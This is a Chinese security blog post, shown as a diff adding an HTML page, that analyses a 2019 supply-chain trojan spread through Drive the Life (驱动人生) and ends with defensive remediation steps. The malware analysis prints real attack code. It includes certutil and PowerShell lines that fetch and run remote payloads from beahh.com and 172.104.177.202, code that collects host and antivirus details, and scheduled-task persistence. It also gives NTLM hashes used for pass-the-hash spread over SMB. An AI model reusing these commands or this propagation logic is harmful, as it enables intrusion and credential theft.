@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>驱动人生供应链木马攻击2019.1.30变种木马分析 « 倾旋的博客</title>
+  <meta name="description" content="360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新……">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2019-02-23/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">驱动人生供应链木马攻击2019.1.30变种木马分析</h1>
+    <p class="post-meta">Feb 23, 2019</p>
+  </header>
+
+  <article class="post-content">
+    <p>360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新……
+<!--more--></p>
+
+<h2 id="0x00-事件背景">0x00 事件背景</h2>
+
+<p>360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。</p>
+
+<p>pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。</p>
+
+<h2 id="0x01-分析研讨">0x01 分析研讨</h2>
+
+<p>由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。</p>
+
+<p>PS:样本代码过长，遂使用图片截图</p>
+
+<h2 id="0x02-分析过程">0x02 分析过程</h2>
+
+<h3 id="解密第一层">解密第一层</h3>
+
+<p>病毒样本：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x00.png" alt=""></p>
+
+<p>第一个动作，创建一个名为<code class="language-plaintext highlighter-rouge">Certificate</code>的任务计划，在七点开始，每隔一小时执行一次以下命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&gt;nul&amp;expand -r v.dat&gt;nul&amp;v.bat&gt;nul&amp;del v.dat v.bat&gt;nul)
+
+</code></pre></div></div>
+
+<p>由于目前<code class="language-plaintext highlighter-rouge">cert.beahh.com</code>已经无法访问，所以进行下一个powershell分析环节。</p>
+
+<p>首先，<code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -ep bypass -e </code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。</p>
+
+<p>Windows中的powershell执行策略：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Rvn0xsy&gt; Get-ExecutionPolicy -List
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      Process       Undefined
+  CurrentUser       Undefined
+ LocalMachine          Bypass
+</code></pre></div></div>
+
+<p>将后面的base64解密后：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x01.png" alt=""></p>
+
+<p>得到如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while($true)
+{
+[System.Threading.Thread]::Sleep(200000);
+[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
+$q = [System.Net.WebRequest]::Create("http://new.beahh.com/startup.php?ver=1&mac="+$m+"&amp;ver="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&amp;bit="+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
+$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace "##";
+$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
+iex $c;
+[System.Threading.Thread]::Sleep(1000000);
+}
+</code></pre></div></div>
+
+<p>外部是一个循环，将Sleep去除后，可以看到调用了<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>，<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>是一个能将变量的内容当作powershell表达式执行的函数。</p>
+
+<p>而iex只是<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>的别名。</p>
+
+<p>下面简单演示几个例子：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Rvn0xsy&gt; iex "Write-Host Rvn0xsy"
+Rvn0xsy
+PS C:\Users\Rvn0xsy&gt; Write-Host Rvn0xsy
+Rvn0xsy
+PS C:\Users\Rvn0xsy&gt; Invoke-Expression "Write-Host Rvn0xsy"
+Rvn0xsy
+PS C:\Users\Rvn0xsy&gt;
+</code></pre></div></div>
+<p>将上述的木马脚本中iex替换成Write-Host即可：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while($true)
+{
+
+[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
+$q = [System.Net.WebRequest]::Create("http://new.beahh.com/startup.php?ver=1&mac="+$m+"&amp;ver="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&amp;bit="+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
+$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace "##";
+$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
+Write-Host $c;
+}
+</code></pre></div></div>
+<p>在这里我们使用Windows 10自带的Windows Powershell ISE脚本调试器来进行后续的分析。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x02.png" alt=""></p>
+
+<h3 id="解密第二层">解密第二层</h3>
+
+<p>很明显，我们看到有<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>，直接将<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>改为<code class="language-plaintext highlighter-rouge">Write-Host</code>进行调试。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x03.png" alt=""></p>
+
+<h3 id="解密第三层">解密第三层</h3>
+
+<p>现在获得的代码可读性变得非常低了，但是还是有一定规律可循。</p>
+
+<p>在第83行，有一个大小写混合的<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x04.png" alt=""></p>
+
+<p>并且<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>做左边还有一个管道符，直接将代码改为<code class="language-plaintext highlighter-rouge">| Out-File .\tmp.log</code> ，把结果输出到tmp.log文件中。</p>
+
+<h3 id="解密第四层">解密第四层</h3>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x05.png" alt=""></p>
+
+<p>第四次好像混淆的更加厉害来，但是不影响我们的分析，先看首行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')((('[string]3CHav = U'+'ABUAB[string]....
+</code></pre></div></div>
+
+<p>其中它是以<code class="language-plaintext highlighter-rouge">. (表达式)(表达式)</code>来执行的，于是我想到了另外一种函数调用的可能：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Rvn0xsy&gt; . Write-Host "Rvn0xsy"
+Rvn0xsy
+PS C:\Users\Rvn0xsy&gt;
+</code></pre></div></div>
+
+<p>这样也能执行，所以我判断<code class="language-plaintext highlighter-rouge"> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>就是<code class="language-plaintext highlighter-rouge">iex</code>或者<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>，我将<code class="language-plaintext highlighter-rouge"> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>改为<code class="language-plaintext highlighter-rouge">Write-Host</code>直接执行：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x06.png" alt=""></p>
+
+<p>最终获得了未混淆的代码。</p>
+
+<p>然后，为了验证我的猜想，我把代码进行更改，获得了<code class="language-plaintext highlighter-rouge">Iex</code>：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x07.png" alt=""></p>
+
+<p><code class="language-plaintext highlighter-rouge"> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code> = <code class="language-plaintext highlighter-rouge">Iex</code></p>
+
+<h2 id="0x03-行为分析">0x03 行为分析</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[string]$av = ""[string]$avs = ""[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
+ace root\SecurityCenter2 -Class AntiVirusProduct).displayNameif($avs.GetType().name.IndexOf('Object') -gt -1){for($v = 0; $v -lt $avs.Count; $v++){$av += $avs[$v] + "|"}}else{$av 
+= $avs}try{if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq "Running"){$av += 'ZDFY'}}catch{}#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum
+ 100000))$path = "$env:temp\ppp.log"[string]$flag = test-path $path$key = "&amp;mac="+$mac+"&amp;av="+$av+"&amp;ver="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&amp;bit="+(Get-WmiObj
+ect Win32_OperatingSystem).OSArchitecture + "&amp;flag2=" + $flag + "&amp;domain=" + (Get-WmiObject win32_computersystem).Domain + "&amp;user=" + $env:USERNAMEtry{$file = "$env:appdata\Micro
+soft\cred.ps1"$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum$file2 = "$env:ALLUSERSPROFILE\Microsoft\cred.ps1"$size2 = (Get-ChildItem $file2 
+-recurse | Measure-Object -property length -sum).sum        if(($size -ne 50731) -and ($size2 -ne 50731)){try{$url = 'http://172.104.177.202/new.dat?xl' + $key(New-Object System.N
+et.WebClient).DownloadFile($url,"$file")}catch{}&amp;cmd.exe /c schtasks /create /sc MINUTE /mo 60 /st 07\:00\:00 /tn Credentials /tr "powershell -nop -w hidden -ep bypass -f %appdata%\
+Microsoft\cred.ps1" /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-Process -Force -processname powershell
+</code></pre></div></div>
+
+<p>大致意思就是收集本机的操作系统版本、用户名、MAC地址、杀毒软件写入当前环境变量的<code class="language-plaintext highlighter-rouge">temp\ppp.log</code>中。</p>
+
+<p>一般是<code class="language-plaintext highlighter-rouge">C:\Users\&lt;USERNAME&gt;\AppData\Local\Temp\ppp.log</code></p>
+
+<p>然后下载新的powershell文件，到<code class="language-plaintext highlighter-rouge">C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\cred.ps1</code>中。</p>
+
+<p>下载的URL是：http://172.104.177.202/new.dat?xl</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x08.png" alt=""></p>
+
+<p>目前ti上未打标签。</p>
+
+<p>再次经过N层解密后，得到如下代码：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x09.png" alt=""></p>
+
+<p>大约6000多行</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x10.png" alt=""></p>
+
+<p>脚本的功能：</p>
+
+<p>1.获得当前用户Hash，读取注册表</p>
+
+<p>2.获得当前系统版本、MAC地址、当前系统所有用户、反病毒软件，尤其是360 Zhudongfangyu服务</p>
+
+<p>3.端口扫描，全量1-65535、445、139都会扫描</p>
+
+<p>4.依赖于445 SMB服务进行传播</p>
+
+<p>其中，常用的Hash和用户名：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[string[]]$global:alluser = @("administrator","admin")[string[]]$global:allpass = @("32ed87bdb5fdc5e9cba88547376818d4","8846f7eaee8fb117ad06bdd830b7586c","7b592e4f8178b4c75788531b2e747687","3fa45a060bd2693ae4c05b601d05ca0c","69943c5e63b4d2c104dbbcc15138b72b","588feb889288fb953b5f094d47d1565c","3dbde697d71690a769204beb12283678","df54de3f3438343202c1dd523d0265be","7ce21f17c0aee7fb9ceba532d0546ad6","2d7f1a5a61d3a96fb5159b5eef17adc6","6103d9d963c57275dd3533674708e7be","579110c49145015c47ecd267657d3174","af27efb60c7b238910efe2a7e0676a39","259745cb123a52aa2e693aaacca2db52","4057b60b514c5402dde3d29a1845c366","e8cd0e4a9e89eab931dc5338fcbec54a","f1351ac828428d74f6da2968089fc91f","b5fe2db507cc5ac540493d48fbd5fe33","12bdea0a1cb9486c067deaa851ac1609","f9e37e83b83c47a93c2f09f66408631b","b23a90d0aad9da3615fafc27a1b8baeb","a333f09e72c683f0205049d0db8b81fb","ad70819c5bc807280974d80f45982011","2d20d252a479f485cdf5e171d93985bf","0b6549421b2e7333e0e281f3ba5eea94","209c6174da490caeb422f3fa5a7ae634","a80c9cc3f8439ada25af064a874efe2d","22315d6ed1a7d5f8a7c98c40e9fa2dec","b963c57010f218edc2cc3c229b5e4d0f","96880159e785de5314803b1169768900","8ec60adea316d957d1cf532c5841758d","c22b315c040ae6e0efee3518d830362b","7a21990fcd3d759941e45c490f143d5f","328727b81ca05805a68ef26acb252039","31c72c210ecc03d1eae94fa496069448","209c6174da490caeb422f3fa5a7ae634","674e48b68c5cd0efd8f7e5faa87b3d1e","31fc0dc8f7dfad0e8bd7ccc3842f2ce9","579110c49145015c47ecd267657d3174","f2477a144dff4f216ab81f2ac3e3207d","62b26c13b70e7d5a9724710a41e63688","5835048ce94ad0564e29a924a03510ef","7773c08920232397cae081704964b786","a4141712f19e9dd5adf16919bb38a95c","b3ec3e03e2a202cbd54fd104b8504fef","f9e37e83b83c47a93c2f09f66408631b","162e829be112225fedf856e38e1c65fe","f67f5e3f66efd7298be6acd32eeeb27c")
+</code></pre></div></div>
+
+<p>SMB服务传播代码：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x11.png" alt=""></p>
+
+<p>会上传启动项：<code class="language-plaintext highlighter-rouge">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code></p>
+
+<p>这个run.bat就是我拿到的种子了。</p>
+
+<p>该木马涵盖了Windows SMB客户端的所有代码，以及哈希传递技术的所有功能。</p>
+
+<p>代码有很多都是采用了Invoke-SMBClient。</p>
+
+<p>优先感染子网：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.
+172.
+192.168.
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x12.png" alt=""></p>
+
+<p>其中在开始横向传播之前，它还会下载一个powershell代码：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x13.png" alt=""></p>
+
+<p>但是目前这个域名已经无法访问，无法继续进行跟进。</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://p.beahh.com/upgrade.php?ver=1&mac=</code></p>
+
+<p>其中在<code class="language-plaintext highlighter-rouge">$bytebase64</code>中发现了<code class="language-plaintext highlighter-rouge">run.bat</code>的代码：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x14.png" alt=""></p>
+
+<h2 id="0x04-预警与排查方案">0x04 预警与排查方案</h2>
+
+<ul>
+  <li>1.开启Windows防火墙、关闭445端口。</li>
+  <li>2.防火墙禁止向<code class="language-plaintext highlighter-rouge">172.104.177.202</code>建立连接。</li>
+  <li>3.防火墙禁止与<code class="language-plaintext highlighter-rouge">*.beahh.com</code>域名的解析。</li>
+  <li>4.更改操作系统账号密码。</li>
+  <li>5.删除<code class="language-plaintext highlighter-rouge">Certificate</code>任务计划。</li>
+  <li>6.删除<code class="language-plaintext highlighter-rouge">Credentials</code>任务计划。</li>
+  <li>7.删除启动项<code class="language-plaintext highlighter-rouge">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code>。</li>
+  <li>8.删除<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\cred.ps1</code>。</li>
+</ul>
+
+<p>最主要就是禁止与<code class="language-plaintext highlighter-rouge">172.104.177.202</code>进行通信。</p>
+
+<p>下载器样本：https://payloads.online/scripts/2019-02-23-downloader.txt</p>
+
+<p>木马本体（解密后）：https://payloads.online/scripts/2019-02-23-res.txt</p>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
